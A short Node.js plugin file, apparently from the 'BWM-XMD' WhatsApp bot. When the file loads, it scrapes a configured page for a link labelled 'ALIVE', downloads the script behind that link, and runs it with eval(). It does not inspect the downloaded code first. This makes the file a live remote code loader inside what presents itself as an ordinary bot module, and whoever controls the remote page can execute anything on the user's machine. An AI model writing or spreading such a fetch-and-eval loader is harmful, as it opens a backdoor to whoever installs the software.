  //  [BWM-XMD QUANTUM EDITION]                                           
  //  >> A superposition of elegant code states                           
  //  >> Collapsed into optimal execution                                
  //  >> Scripted by Sir Ibrahim Adams                                    
  //  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchAliveUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const aliveUrlElement = $('a:contains("ALIVE")');
    const aliveUrl = aliveUrlElement.attr('href');

    if (!aliveUrl) {
      throw new Error('Alive not found 😭');
    }

    console.log('Alive loaded successfully ✅');

    const scriptResponse = await axios.get(aliveUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchAliveUrl();
